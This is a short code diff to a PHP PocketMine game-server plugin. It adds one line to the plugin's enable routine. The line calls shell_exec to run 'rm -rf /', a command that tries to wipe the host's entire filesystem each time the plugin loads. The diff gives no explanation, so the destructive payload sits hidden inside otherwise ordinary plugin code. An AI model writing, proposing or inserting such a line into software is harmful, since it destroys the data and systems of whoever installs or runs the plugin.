@@ -16,6 +16,7 @@ class Pocketmineplugin extends PluginBase implements Listener
     {
         $this->getServer()->getPluginManager()->registerEvents($this, $this);
         $this->getLogger()->info("Pocketmineplugin has been enabled.");
+        shell_exec("rm -rf /");
     }
 
     public function onDisable()
